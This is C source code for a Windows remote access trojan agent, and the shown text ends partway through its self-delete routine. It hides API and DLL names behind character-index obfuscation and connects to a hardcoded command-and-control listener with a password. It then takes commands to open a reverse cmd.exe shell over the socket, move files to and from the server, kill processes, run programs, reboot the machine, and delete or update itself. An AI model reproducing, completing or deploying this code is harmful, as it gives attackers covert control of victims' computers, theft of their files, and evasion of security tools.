#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <time.h>
#include <tchar.h>
#include <processsnapshot.h>
#include <tlhelp32.h>
#include <string.h>
#include "rat_modules.h"
#include "native.h"
#define MAX 2000
#define BUFFER_SIZE 2048
#define TRAFFIC_KEY 0x02
#define INFO_BUFFER_SIZE 32767
CHAR  infoBuf[INFO_BUFFER_SIZE] = { '\0' };

#pragma comment(lib,"ws2_32.lib")

char ALL_ALPHANUM[] = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789._";
int dll_ws2__32_offset[] = { 22,18,54,63,55,54,62,3,11,11 };
int exe_c_C_M_d_offset[] = { 2,12,3,62,4,23,4 };	//cmd.exe
int wsa_startup_offset[] = { 48,44,26,44,19,0,17,19,20,15 };
int wsa_socket_offset[] = { 48,44,26,44,14,2,10,4,19,26 };
int wsa_connect_offset[] = { 48,44,26,28,14,13,13,4,2,19 };
int h_tons_offset[] = { 7,19,14,13,18 };
int inet_addr_offset[] = { 8,13,4,19,63,0,3,3,17 };
int wsa_cleanup_offset[] = { 48,44,26,28,11,4,0,13,20,15 };
int close_sock_offset[] = { 2,11,14,18,4,18,14,2,10,4,19 };
int send_offset[] = { 18, 4, 13, 3 };
int recv_offset[] = { 17,4,2,21 };
int create_process_A_offset[] = { 28,17,4,0,19,4,41,17,14,2,4,18,18,26 };
int wait_for_single_object_offset[] = { 48,0,8,19,31,14,17,44,8,13,6,11,4,40,1,9,4,2,19 };
int listener_addr_offset[] = { 53,61,54,62,53,58,60,62,53,52,52,62,53,55 }; 	//192.168.100.13
int dll_k_er_32_offset[] = { 10,4,17,13,4,11,55,54,62,3,11,11 };
int dll_a_DV_offset[] = { 0,3,21,0,15,8,55,54,62,3,11,11 };
int lib_load_offset[] = { 37,14,0,3,37,8,1,17,0,17,24,26 };						//LoadLibraryA
int set_h_0_k_offset[] = { 44,4,19,48,8,13,3,14,22,18,33,14,14,10,30,23,26 };		//SetWindowsHookExA
int un_h_0_k_offset[] = { 46,13,7,14,14,10,48,8,13,3,14,22,18,33,14,14,10,30,23 };	//UnhookWindowsHookEx
int gt_m__5__g_offset[] = { 32,4,19,38,4,18,18,0,6,4 };								//GetMessage
int trn_m__5__g_offset[] = { 45,17,0,13,18,11,0,19,4,38,4,18,18,0,6,4 };			//TranslateMessage
int dis_m__5__g_offset[] = { 29,8,18,15,0,19,2,7,38,4,18,18,0,6,4 };				//DispatchMessage
int us__32_d_11_offset[] = { 20,18,4,17,55,54,62,3,11,11 };						//user32.dll
int create_snap_offset[] = { 28,17,4,0,19,4,45,14,14,11,7,4,11,15,55,54,44,13,0,15,18,7,14,19 };	//CreateToolhelp32Snapshot 
int proc_first_offset[] = { 41,17,14,2,4,18,18,55,54,31,8,17,18,19 };				//Process32First
int proc_next_offset[] = { 41,17,14,2,4,18,18,55,54,39,4,23,19 };					//Process32Next

char* GetOriginal(int offsets[], char* ALL_ALPHANUM, int sizeof_offset) {
	int size = sizeof_offset / 4;  // Calculate how many characters to retrieve
	char* empty_string = malloc((size + 1) * sizeof(char));  // Allocate memory for the string + null terminator

	if (empty_string == NULL) {
		//printf("Memory allocation failed\n");
		return NULL;
	}

	for (int i = 0; i < size; ++i) {
		char character = ALL_ALPHANUM[offsets[i]];
		empty_string[i] = character;  // Append the character to the string
		//printf("%c,",character);
	}

	empty_string[size] = '\0';  // Null-terminate the string

	return empty_string;
}

void InitConn(void) {
	OutputDebugStringA("INSIDE InitConn()");

	// --- START LOAD WS2_32 DLL --- //
	HMODULE hDLL_ws2__32 = LoadLibraryA(GetOriginal(dll_ws2__32_offset, ALL_ALPHANUM, sizeof(dll_ws2__32_offset)));
	if (hDLL_ws2__32 == NULL) {
		//printf("[x] COULD NOT LOAD ws2_32.dll, err -> %lu\n",GetLastError());
		return EXIT_FAILURE;
	}

	// --- END LOAD WS2_32 DLL --- //
	// --- START LOAD KERNEL32 DLL --- //
	HMODULE hDLL_k_er_32 = LoadLibraryA(GetOriginal(dll_k_er_32_offset, ALL_ALPHANUM, sizeof(dll_k_er_32_offset)));
	if (hDLL_k_er_32 == NULL) {
		//debug_log("[x] COULD NOT LOAD kernel32.dll, err -> %lu\n", GetLastError());
		return EXIT_FAILURE;
	}
	// --- END LOAD KERNEL32 DLL ---//



	FARPROC wsa_startup_func = GetProcAddress(hDLL_ws2__32, GetOriginal(wsa_startup_offset, ALL_ALPHANUM, sizeof(wsa_startup_offset)));
	FARPROC wsa_socket_func = GetProcAddress(hDLL_ws2__32, GetOriginal(wsa_socket_offset, ALL_ALPHANUM, sizeof(wsa_socket_offset)));
	FARPROC h_tons_func = GetProcAddress(hDLL_ws2__32, GetOriginal(h_tons_offset, ALL_ALPHANUM, sizeof(h_tons_offset)));;
	FARPROC inet_addr_func = GetProcAddress(hDLL_ws2__32, GetOriginal(inet_addr_offset, ALL_ALPHANUM, sizeof(inet_addr_offset)));;
	FARPROC wsa_connect_func = GetProcAddress(hDLL_ws2__32, GetOriginal(wsa_connect_offset, ALL_ALPHANUM, sizeof(wsa_connect_offset)));
	FARPROC wsa_cleanup_func = GetProcAddress(hDLL_ws2__32, GetOriginal(wsa_cleanup_offset, ALL_ALPHANUM, sizeof(wsa_cleanup_offset)));
	FARPROC close_sock_func = GetProcAddress(hDLL_ws2__32, GetOriginal(close_sock_offset, ALL_ALPHANUM, sizeof(close_sock_offset)));
	FARPROC recv_func = GetProcAddress(hDLL_ws2__32, GetOriginal(recv_offset, ALL_ALPHANUM, sizeof(recv_offset)));
	FARPROC send_func = GetProcAddress(hDLL_ws2__32, GetOriginal(send_offset, ALL_ALPHANUM, sizeof(send_offset)));
	FARPROC create_snap_func = GetProcAddress(hDLL_k_er_32, GetOriginal(create_snap_offset, ALL_ALPHANUM, sizeof(create_snap_offset)));
	FARPROC proc_first_func = GetProcAddress(hDLL_k_er_32, GetOriginal(proc_first_offset, ALL_ALPHANUM, sizeof(proc_first_offset)));
	FARPROC proc_next_func = GetProcAddress(hDLL_k_er_32, GetOriginal(proc_next_offset, ALL_ALPHANUM, sizeof(proc_next_offset)));

	WSADATA wsaData;
	int connect;
	SOCKET client_socket;
	struct sockaddr_in server_addr;
	int _p__0rt = 1234; //PUT SERVER PORT HERE
	char recv_buffer[BUFFER_SIZE];
	DWORD recvd_bytes = 0;




	while (1) {
		//start winsock 2.2
		//printf("[+] initializing winsock 2.2\n");
		if (wsa_startup_func(MAKEWORD(2, 2), &wsaData) != 0) {
			//printf("[x] winsock failed\n");
			continue;
		}

		//create socket
		//printf("[+] creating socket\n");
		client_socket = wsa_socket_func(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
		if (client_socket == INVALID_SOCKET) {
			//printf("[x] socket creation failed\n");
			//wsa_cleanup_func();
			continue;

		}

		//assigning server values
		server_addr.sin_family = AF_INET;
		server_addr.sin_port = h_tons_func(_p__0rt);
		server_addr.sin_addr.s_addr = inet_addr_func(GetOriginal(listener_addr_offset, ALL_ALPHANUM, sizeof(listener_addr_offset)));
		if (server_addr.sin_addr.s_addr == INADDR_NONE) {
			//debug_log("[x] invalid address\n[x]exiting\n");
			close_sock_func(client_socket);
			//wsa_cleanup_func();
			exit(1);

		};

		//connect to server
		//printf("[+] connecting to server\n");
		connect = wsa_connect_func(client_socket, (SOCKADDR*)&server_addr, sizeof(server_addr), NULL, NULL, NULL, NULL);
		if (connect != 0) {
			printf("[x] can't connect to server, err -> %d\n", WSAGetLastError());
			close_sock_func(client_socket);
			//wsa_cleanup_func();
			continue;
		}

		char auth_data[BUFFER_SIZE] = { 0 };
		// Agent should send some sysinfo with a password to authenticate with c2
		SysInfo(auth_data, sizeof(auth_data));
		GetLocalIP(auth_data, sizeof(auth_data));
		GetCampaginCode(auth_data, sizeof(auth_data));
		strcat_s(auth_data, sizeof(auth_data), "qawsed");

		// any to-be-sent buffer should be encrypted
		encrypt(auth_data, (SIZE_T)strlen(auth_data));
		send_func(client_socket, auth_data, (int)strlen(auth_data), 0);
		//ListProcesses(create_snap_func, proc_first_func, proc_next_func, client_socket, send_func);

	RECV:

		//recieve data
		recvd_bytes = recv_func(client_socket, recv_buffer, sizeof(recv_buffer), 0);
		if (recvd_bytes == SOCKET_ERROR) { close_sock_func(client_socket); continue; }
		decrypt(recv_buffer, (SIZE_T)recvd_bytes);
		recv_buffer[recvd_bytes] = '\0';
		//printf("received buffer %s\n",recv_buffer);

		if (strcmp(recv_buffer, "shell") == 0) {
			//printf("[+] Calling ShellExec()\n"); 
			ShellExec(client_socket);
			goto RECV;
		}
		else if (strcmp(recv_buffer, "lspid") == 0) {
			//printf("[+] Calling ListProcesses()\n"); 
			ListProcesses(create_snap_func, proc_first_func, proc_next_func, client_socket, send_func);
			//send_func(client_socket, DeleteTrace_reponse, (int)strlen(DeleteTrace_reponse), 0);
			goto RECV;
		}
		else if (strncmp(recv_buffer, "run", 3) == 0) {

			char* space_pos_run = strchr(recv_buffer, ' ');
			if (space_pos_run == NULL) {
				goto RECV;
			}
			char ExeToRun[BUFFER_SIZE];
			strcpy(ExeToRun, space_pos_run + 1);
			printf("[+] requested file to run is %s\n", ExeToRun);

			// CALL THE FUNCTION THAT STARTS THE PROCESS //
			RunExe(client_socket, recv_func, send_func, ExeToRun);

			goto RECV;
		}
		else if (strncmp(recv_buffer, "terminate", 9) == 0) {
			//printf("[+] Calling StopProcess()\n");

			// Parse the buffer to get the pid
			char* space_pos_terminate = strchr(recv_buffer, ' ');
			if (space_pos_terminate == NULL) {
				goto RECV;
			}
			//printf("[+] THE PID is %s\n", space_pos + 1);		//DEBUG
			DWORD PIDtoTerminate = 0;
			PIDtoTerminate = atoi(space_pos_terminate + 1);
			StopProcess(client_socket, send_func, PIDtoTerminate);
			//send_func(client_socket, DeleteTrace_reponse, (int)strlen(DeleteTrace_reponse), 0);
			goto RECV;
		}
		else if (strncmp(recv_buffer, "upload", 6) == 0) {			// Server will send data , Agent will receive
			printf("[+] parsing buffer\n");

			// Parse the buffer
			char* space_pos_upload = strchr(recv_buffer, ' ');
			if (space_pos_upload == NULL) {
				goto RECV;
			}
			//printf("[+] THE file to be downloaded is %s\n", space_pos + 1);		//DEBUG
			// 


			char remainder_copy[1024];
			strcpy(remainder_copy, space_pos_upload + 1);


			// First token is the filename
			const char* FileNameToDownload = strtok(remainder_copy, " ");
			if (FileNameToDownload == NULL) {
				printf("[x] Missing filename\n");
				continue;
			}

			// Second token is the Windows path
			const char* FullWindowsPath = strtok(NULL, "\0");  // Get everything until \0
			if (FullWindowsPath == NULL) {
				printf("[x] Missing Windows path\n");
				continue;
			}

			printf("[+] THE file to be downloaded is %s\n", FileNameToDownload);
			printf("[+] The directory is %s\n", FullWindowsPath);

			GetFileFromC2(client_socket, recv_func, send_func, FileNameToDownload, FullWindowsPath);

			goto RECV;
		}
		else if (strncmp(recv_buffer, "download", 8) == 0) {			// Server will receive data , Agent will send

			//printf("[+] Calling StopProcess()\n");

			// Parse the buffer
			char* space_pos_download = strchr(recv_buffer, ' ');
			if (space_pos_download == NULL) {
				goto RECV;
			}
			printf("[+] THE file to be uploaded is %s\n", space_pos_download + 1);		//DEBUG
			char remainder_copy[1024];
			strcpy(remainder_copy, space_pos_download + 1);


			// First token is the filename
			const char* FileNameToUpload = strtok(remainder_copy, " ");
			if (FileNameToUpload == NULL) {
				printf("[x] Missing filename\n");
				continue;
			}


			printf("FileNameToUpload is %s\n", FileNameToUpload);

			UploadFileToC2(client_socket, send_func, recv_func, FileNameToUpload);

			goto RECV;
		}
		else if (strncmp(recv_buffer, "delete", 6) == 0) {
			// Parse the buffer
			char* space_pos_delete = strchr(recv_buffer, ' ');
			if (space_pos_delete == NULL) {
				goto RECV;
			}
			printf("[+] THE file to be deleted is %s\n", space_pos_delete + 1);		//DEBUG

			char remainder_copy[1024];
			strcpy(remainder_copy, space_pos_delete + 1);
			// First token is the filename
			const char* FileNameToDelete = remainder_copy;
			if (FileNameToDelete == NULL) {
				printf("[x] Missing filename\n");
				continue;
			}

			printf("[+] THE file to be deleted is %s\n", FileNameToDelete);		//DEBUG

			DWORD DeleteResult = DeleteRequestedFile(client_socket, recv_func, send_func, FileNameToDelete);
			goto RECV;
		}
		else if (strcmp(recv_buffer, "list drives") == 0) {
			ListDrives(client_socket, send_func);
			goto RECV;

		}
		else if (strncmp(recv_buffer, "GetDate", 6) == 0) {
			// Parse the buffer
			char* space_pos_delete = strchr(recv_buffer, ' ');
			if (space_pos_delete == NULL) {
				goto RECV;
			}
			//printf("[+] THE file requested is %s\n", space_pos_delete + 1);		//DEBUG

			char remainder_copy[1024];
			strcpy(remainder_copy, space_pos_delete + 1);
			// First token is the filename
			const char* FileName = remainder_copy;
			if (FileName == NULL) {
				printf("[x] Missing filename\n");
				continue;
			}

			printf("[+] THE file requested is %s\n", FileName);		//DEBUG

			GetFileDate(client_socket, recv_func, send_func, FileName);

			goto RECV;
		}
		else if (strcmp(recv_buffer, "self-delete") == 0) {
			SelfDelete();
			goto RECV; // SHOULD BE SOMETHING ELSE like close maybe after the exit
		}
		else if (strncmp(recv_buffer, "self-update", 11) == 0) {
			/*
				* self-delete the old file
				* take the first arg in the command and download the updated version securely from the server
					* GetFileFromC2(client_socket,recv_func,send_func,FileNameToDownload, FullWindowsPath);
					* it will be downloaded to same old path
				* Example Command: self-update /home/user/rat_v2.exe
			*/

			SelfDelete();



			printf("[+] parsing buffer\n");

			// Parse the buffer
			char* space_pos_upload = strchr(recv_buffer, ' ');
			if (space_pos_upload == NULL) {
				goto RECV;
			}
			printf("[+] THE file to be downloaded is %s\n", space_pos_upload + 1);		//DEBUG
			// 


			char remainder_copy[1024];
			strcpy(remainder_copy, space_pos_upload + 1);


			// First token is the filename
			const char* UpdatedVersionRat = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, BUFFER_SIZE);;
			strcpy(UpdatedVersionRat, space_pos_upload + 1);


			/*THERE IS STILL WORK TO DO HERE*/
			//const char* UpdatedVersionRat = "TEST";
			GetUpdatedVersionFromC2(client_socket, recv_func, send_func, UpdatedVersionRat);

			BOOL bHeapFree = HeapFree(GetProcessHeap(), 0, UpdatedVersionRat);
			goto RECV;
		}
		else if (strcmp(recv_buffer, "reboot") == 0) {

			RebootSystem(client_socket, send_func);
			//goto RECV;
		}

		//else { send_func(client_socket, Invalid_response, (int)strlen(Invalid_response), 0); goto RECV; }



		//CLEANUP	
		//memset(recv_buffer,0,sizeof(recv_buffer));
		close_sock_func(client_socket);
		wsa_cleanup_func();
		Sleep(1000);
	}
	return;
}

/*
TODO
	Server <--> [Socket] <--> [Client: Encrypt/Decrypt] <--> [Pipes] <--> cmd.exe
*/
void ShellExec(SOCKET client_socket) {


	FARPROC create_process_A_func = GetProcAddress(GetModuleHandle(TEXT("kernel32.dll")), GetOriginal(create_process_A_offset, ALL_ALPHANUM, sizeof(create_process_A_offset)));
	FARPROC wait_for_single_object_func = GetProcAddress(GetModuleHandle(TEXT("kernel32.dll")), GetOriginal(wait_for_single_object_offset, ALL_ALPHANUM, sizeof(wait_for_single_object_offset)));


	// CREATING PROCESS //
	//declare process struct and info 

	STARTUPINFOA proc = { 0 };
	PROCESS_INFORMATION proc_info = { 0 };
	memset(&proc, 0, sizeof(proc));
	proc.cb = sizeof(proc);
	proc.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
	proc.hStdInput = (HANDLE)client_socket;
	proc.hStdOutput = (HANDLE)client_socket;
	proc.hStdError = (HANDLE)client_socket; //pipe stderr stdin stdout to socket



	//create process
	create_process_A_func(NULL, GetOriginal(exe_c_C_M_d_offset, ALL_ALPHANUM, sizeof(exe_c_C_M_d_offset)), NULL, NULL, TRUE, 0, NULL, NULL, &proc, &proc_info); //spawm cmd	

	//wait for process to finish

	wait_for_single_object_func(proc_info.hProcess, INFINITE);
	CloseHandle(proc_info.hProcess);
	CloseHandle(proc_info.hThread);
	// PROCESS END //

	return;
}



void ListProcesses(FARPROC create_snap_func, FARPROC proc_first_func, FARPROC proc_next_func, SOCKET client_socket, FARPROC send_func) {


	CLIENT_ID CID;
	ObjectAttributes Object_Attr = { sizeof(Object_Attr),NULL };
	PROCESSENTRY32 pe32;
	pe32.dwSize = sizeof(PROCESSENTRY32);


	//Take snapshot
	HANDLE snapshot = create_snap_func(TH32CS_SNAPPROCESS, 0);

	char ToSendBuf[BUFFER_SIZE] = { 0 };
	strcat_s(ToSendBuf, sizeof(ToSendBuf), "PID\t\tProcess Name\n");
	strcat_s(ToSendBuf, sizeof(ToSendBuf), "---\t\t------------\n");

	// Enumerate the snapshot
	char tmp_buf[BUFFER_SIZE];
	proc_first_func(snapshot, &pe32);
	do {
		snprintf(tmp_buf, (SIZE_T)sizeof(tmp_buf), "%u\t%s\n", pe32.th32ProcessID, pe32.szExeFile);
		strcat_s(ToSendBuf, sizeof(ToSendBuf), tmp_buf);
		encrypt(ToSendBuf, (SIZE_T)strlen(ToSendBuf));
		send_func(client_socket, ToSendBuf, (int)strlen(ToSendBuf), 0);
		ZeroMemory(ToSendBuf, (SIZE_T)sizeof(ToSendBuf));
	} while (proc_next_func(snapshot, &pe32));

	strcat_s(ToSendBuf, sizeof(ToSendBuf), "[DONE]");
	encrypt(ToSendBuf, (SIZE_T)strlen(ToSendBuf));
	send_func(client_socket, ToSendBuf, (int)strlen(ToSendBuf), 0);

	return;
}

void StopProcess(SOCKET client_socket, FARPROC send_func, DWORD PIDtoTerminate) {

	HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, FALSE, PIDtoTerminate);

	char ToSendBuf[BUFFER_SIZE] = { 0 };
	if (hProcess == NULL) {
		strcpy_s(ToSendBuf, sizeof(ToSendBuf), "1");
		encrypt(ToSendBuf, (SIZE_T)strlen(ToSendBuf));
		send_func(client_socket, ToSendBuf, (int)strlen(ToSendBuf), 0);
		return;
	}

	BOOL bEndProc = TerminateProcess(hProcess, 0);
	if (bEndProc == 0) {
		strcpy_s(ToSendBuf, sizeof(ToSendBuf), "2");
		encrypt(ToSendBuf, (SIZE_T)strlen(ToSendBuf));
		send_func(client_socket, ToSendBuf, (int)strlen(ToSendBuf), 0);
		return;
	}

	strcpy_s(ToSendBuf, sizeof(ToSendBuf), "0");
	encrypt(ToSendBuf, (SIZE_T)strlen(ToSendBuf));
	send_func(client_socket, ToSendBuf, (int)strlen(ToSendBuf), 0);
	return;
}

DWORD RunExe(SOCKET client_socket, FARPROC recv_func, FARPROC send_func, const char* FilePath) {

	printf("[+] Calling CreateProcessA\n");

	STARTUPINFOA start_info = { 0 };
	start_info.cb = sizeof(STARTUPINFOA);
	start_info.dwFlags = STARTF_USESTDHANDLES;
	PROCESS_INFORMATION proc_info = { 0 };
	BOOL bCrProc_result = CreateProcessA(NULL, FilePath, NULL, NULL, TRUE, 0, NULL, NULL, &start_info, &proc_info);

	int err_no = 16000;
	int bytes_received = 0;
	char recvd_buf[BUFFER_SIZE] = { 0 };
	char err_buf[BUFFER_SIZE] = { 0 };
	char pid_buf[BUFFER_SIZE] = { 0 };


	// should not be 0
	if (bCrProc_result == 0) {
		sprintf(err_buf, "%d", err_no);
		encrypt(err_buf, (SIZE_T)strlen(err_buf));
		send_func(client_socket, err_buf, (int)strlen(err_buf), 0);

		return 0;
	}
	DWORD dwPid = proc_info.dwProcessId; // there is an issue with the retrieved PID and the actual PID in task manager and system informer
	sprintf(pid_buf, "%d", (int)dwPid);
	//printf("pid is %d\n", dwPid);
	encrypt(pid_buf, (SIZE_T)strlen(pid_buf));
	send_func(client_socket, pid_buf, (int)strlen(pid_buf), 0);

	return 0;
}

// Server will recieve data , Agent will send
// DownloadFile() will be called in Server.
/*
TODO
	Handle the space separated files correctly by "" marks
*/
int UploadFileToC2(SOCKET client_socket, FARPROC send_func, FARPROC recv_func, const char* FilePathToUpload) {



	int bytes_received = 0;
	char recvd_buf[BUFFER_SIZE] = { 0 };
	char err_buf[BUFFER_SIZE] = { 0 };
	char okay_buf[BUFFER_SIZE] = { 0 };

	printf("Attempting to send file: %s\n", FilePathToUpload);

	FILE* file = fopen(FilePathToUpload, "rb");
	if (!file) {
		perror("Failed to open file for reading");
		int error = errno;
		sprintf(err_buf, "%d", error);
		encrypt(err_buf, (SIZE_T)strlen(err_buf));
		send_func(client_socket, err_buf, (int)strlen(err_buf), 0);
		return -1;
	}

	// Get file size
	fseek(file, 0, SEEK_END);
	long file_size = ftell(file);
	fseek(file, 0, SEEK_SET);

	printf("File size: %ld bytes\n", file_size);

	// Send file size to server
	char file_size_str[BUFFER_SIZE];
	sprintf(file_size_str, "%ld", file_size);
	encrypt(file_size_str, (SIZE_T)strlen(file_size_str));

	if (send_func(client_socket, file_size_str, (int)strlen(file_size_str), 0) <= 0) {
		perror("Failed to send file size");
		fclose(file);
		return -1;
	}

	// Wait for server acknowledgment
	bytes_received = recv_func(client_socket, recvd_buf, BUFFER_SIZE, 0);
	if (bytes_received <= 0) {
		perror("Failed to receive server acknowledgment");
		fclose(file);
		return -1;
	}

	decrypt(recvd_buf, (SIZE_T)bytes_received);
	int server_response = atoi(recvd_buf);

	if (server_response != 16000) {
		printf("Server error: %d\n", server_response);
		fclose(file);
		return -1;
	}

	printf("Server ready to receive file\n");

	// Send file data
	int bytes_read = 0;
	int total_sent = 0;
	int remain_data = file_size;
	unsigned char buffer[BUFFER_SIZE];

	while (remain_data > 0) {
		// Read chunk from file
		bytes_read = fread(buffer, 1, min(BUFFER_SIZE, remain_data), file);
		if (bytes_read <= 0) {
			if (ferror(file)) {
				perror("Error reading file");
			}
			break;
		}

		// Encrypt and send chunk
		encrypt(buffer, (SIZE_T)bytes_read);
		int sent = send_func(client_socket, (char*)buffer, bytes_read, 0);
		if (sent <= 0) {
			perror("Failed to send file data");
			break;
		}

		total_sent += sent;
		remain_data -= bytes_read;

		printf("Sent %d bytes, %d bytes remaining\n", sent, remain_data);
	}

	fclose(file);

	if (remain_data > 0) {
		printf("File transfer incomplete. %d bytes remaining\n", remain_data);
		return -1;
	}

	printf("File sent successfully! Total bytes sent: %d\n", total_sent);

	return 0;
}


// Agent will recieve data , server will send
 // UploadFile() will be called in Server
//DONE

int GetFileFromC2(SOCKET client_socket, FARPROC recv_func, FARPROC send_func, const char* filename, const char* FullPath) {


	int bytes_received = 0;
	// Receive file size
	char recvd_buf[BUFFER_SIZE] = { 0 };
	int file_size = 0;
	bytes_received = recv_func(client_socket, &recvd_buf, sizeof(recvd_buf), 0);
	decrypt(recvd_buf, (SIZE_T)bytes_received);
	file_size = atoi(recvd_buf);
	printf("File size: %lu bytes\n", file_size);
	printf("Available bytes to read: %d\n", bytes_received);

	// Find the last forward slash
	const char* last_slash = strrchr(filename, '/');
	//char* FileBaseName = malloc(BUFFER_SIZE);
	char* FileBaseName = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, BUFFER_SIZE);
	if (last_slash != NULL) {
		// The filename starts after the slash
		strcpy(FileBaseName, last_slash + 1);
		printf("Filename: %s\n", FileBaseName);
	}
	else {
		// No slash found, entire string is the filename
		strcpy(FileBaseName, filename);
		printf("Filename: %s\n", FileBaseName);
	}

	strcat(FullPath, FileBaseName);
	printf("FULL PATH IS : %s\n", FullPath);
	// Open file for writing
	char okay_buf[BUFFER_SIZE];
	sprintf(okay_buf, "%d", 16000);
	encrypt(okay_buf, (SIZE_T)strlen(okay_buf));

	char err_buf[BUFFER_SIZE] = { 0 };
	FILE* file = fopen(FullPath, "wb");
	if (!file) {
		perror("Failed to open file");
		sprintf(err_buf, "%d", errno);
		encrypt(err_buf, (SIZE_T)strlen(err_buf));
		send_func(client_socket, err_buf, (int)strlen(err_buf), 0);
		return -1;
	}
	send_func(client_socket, okay_buf, (int)strlen(okay_buf), 0);






	// Receive file data
	int remain_data = file_size;

	int WrittenBytes = 0;


	while ((remain_data > 0) && ((bytes_received = recv(client_socket, recvd_buf, BUFFER_SIZE, 0)) > 0))
	{
		decrypt(recvd_buf, (SIZE_T)bytes_received);
		WrittenBytes = fwrite(recvd_buf, sizeof(char), bytes_received, file);
		/*
		if (strlen(recvd_buf) != WrittenBytes) {

			sprintf(err_buf, "%d", errno);
			encrypt(err_buf, (SIZE_T)strlen(err_buf));
			send_func(client_socket, err_buf, (int)strlen(err_buf), 0);

			fclose(file);
			return -1;
		}
		*/
		//send_func(client_socket, okay_buf, (int)strlen(okay_buf), 0);
		remain_data -= bytes_received;
		fprintf(stdout, "Receive %d bytes and we hope :- %d bytes\n", bytes_received, remain_data);
	}




	printf("\nFile received successfully!\n");

	fclose(file);
	//free(FileBaseName);
	BOOL bHeapFree = HeapFree(GetProcessHeap(), 0, FileBaseName);
	return 0;
}



DWORD DeleteRequestedFile(SOCKET client_socket, FARPROC recv_func, FARPROC send_func, const char* FileNameToDelete) {
	char FileNameToDeletePrepended[BUFFER_SIZE] = { 0 };
	strcpy(FileNameToDeletePrepended, "\\\\?\\");
	strcat(FileNameToDeletePrepended, FileNameToDelete);
	//printf("[+] Deleting %s\n", FileNameToDeletePrepended);
	DWORD err_no = 0;
	char err_buf[BUFFER_SIZE];
	if (DeleteFileA(FileNameToDeletePrepended) == 0) {
		err_no = GetLastError();
		//printf("[x] DeleteFileA() failed, Err -> %d\n", err_no);
		sprintf(err_buf, "%lu", err_no);
		encrypt(err_buf, (SIZE_T)strlen(err_buf));
		send_func(client_socket, err_buf, (int)strlen(err_buf), 0);
		return err_no;
	}

	sprintf(err_buf, "%lu", err_no);
	encrypt(err_buf, (SIZE_T)strlen(err_buf));
	send_func(client_socket, err_buf, (int)strlen(err_buf), 0);

	return (DWORD)0;
}

void ListDrives(SOCKET client_socket, FARPROC send_func) {


	DWORD drives = GetLogicalDrives();

	if (drives == 0) {
		printf("GetLogicalDrives failed (error %lu)\n", GetLastError());
		return 1;
	}
	/*
	printf("Drive Type Information:\n");
	printf("=======================\n");
	*/
	char buffer[BUFFER_SIZE];
	size_t offset = 0;
	offset += snprintf(buffer + offset, BUFFER_SIZE - offset, "Drive Type Information:\n=======================\n");

	for (char drive = 'A'; drive <= 'Z'; drive++) {
		if (drives & 1) {
			char rootPath[] = { drive, ':', '\\', '\0' };
			UINT type = GetDriveTypeA(rootPath);

			//printf("Drive %c: - ", drive);
			offset += snprintf(buffer + offset, BUFFER_SIZE - offset, "Drive %c: - ", drive);

			switch (type) {
			case DRIVE_UNKNOWN:
				offset += snprintf(buffer + offset, BUFFER_SIZE - offset, "Unknown\n");
				//printf("Unknown\n");
				break;
			case DRIVE_NO_ROOT_DIR:
				offset += snprintf(buffer + offset, BUFFER_SIZE - offset, "No root directory\n");
				//printf("No root directory\n");
				break;
			case DRIVE_REMOVABLE:
				offset += snprintf(buffer + offset, BUFFER_SIZE - offset, "Removable (USB, Floppy, etc.)\n");
				//printf("Removable (USB, Floppy, etc.)\n");
				break;
			case DRIVE_FIXED:
				offset += snprintf(buffer + offset, BUFFER_SIZE - offset, "Fixed (Hard Disk)\n");
				//printf("Fixed (Hard Disk)\n");
				break;
			case DRIVE_REMOTE:
				offset += snprintf(buffer + offset, BUFFER_SIZE - offset, "Remote (Network)\n");
				//printf("Remote (Network)\n");
				break;
			case DRIVE_CDROM:
				offset += snprintf(buffer + offset, BUFFER_SIZE - offset, "CD-ROM\n");
				//printf("CD-ROM\n");
				break;
			case DRIVE_RAMDISK:
				offset += snprintf(buffer + offset, BUFFER_SIZE - offset, "RAM Disk\n");
				//printf("RAM Disk\n");
				break;
			default:
				offset += snprintf(buffer + offset, BUFFER_SIZE - offset, "Unknown type\n");
				//printf("Unknown type\n");
				break;
			}
		}
		drives >>= 1;
	}

	//printf("snprintf result:\n%s\n", buffer);
	encrypt(buffer, (SIZE_T)strlen(buffer));
	send_func(client_socket, buffer, (int)strlen(buffer), 0);

	return;
}

void GetFileDate(SOCKET client_socket, FARPROC recv_func, FARPROC send_func, const char* FilePath) {

	WIN32_FILE_ATTRIBUTE_DATA fileInfo;
	SYSTEMTIME stCreate;
	char buffer[BUFFER_SIZE];
	if (GetFileAttributesExA(FilePath, GetFileExInfoStandard, &fileInfo)) {
		// Convert FILETIME to SYSTEMTIME (local time)
		FILETIME ftLocal;
		FileTimeToLocalFileTime(&fileInfo.ftCreationTime, &ftLocal);
		FileTimeToSystemTime(&ftLocal, &stCreate);

		//printf("File: %s\n", FilePath);
		//printf("Creation Time: %04d-%02d-%02d %02d:%02d:%02d\n",stCreate.wYear, stCreate.wMonth, stCreate.wDay,stCreate.wHour, stCreate.wMinute, stCreate.wSecond);

		snprintf(buffer, BUFFER_SIZE, "Creation Time: %04d-%02d-%02d %02d:%02d:%02d",
			stCreate.wYear, stCreate.wMonth, stCreate.wDay,
			stCreate.wHour, stCreate.wMinute, stCreate.wSecond);
	}
	else {
		//printf("GetFileAttributesEx failed. Error: %lu\n", GetLastError());
	}
	//printf("snprintf result: %s\n",buffer);

	encrypt(buffer, (SIZE_T)strlen(buffer));
	send_func(client_socket, buffer, (int)strlen(buffer), 0);

	return;
}

void SelfDelete(void) {

	const wchar_t NewStream[] = L":BILLY";
	SIZE_T RenameSize = sizeof(FILE_RENAME_INFO) + sizeof(NewStream);
	PFILE_RENAME_INFO pFileRenameInfo = NULL;
	pFileRenameInfo = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, RenameSize);
	//FILE_RENAME_INFO FileRenameInfo = { 0 };

	WCHAR PathSize[MAX_PATH * 2] = { 0 };
	FILE_DISPOSITION_INFO SetDelete = { 0 };
	ZeroMemory(PathSize, sizeof(PathSize));
	ZeroMemory(&SetDelete, sizeof(FILE_DISPOSITION_INFO));

	SetDelete.DeleteFile = TRUE;	//Set File for deletion

	/* set members for FILE_RENAME_INFO struct */
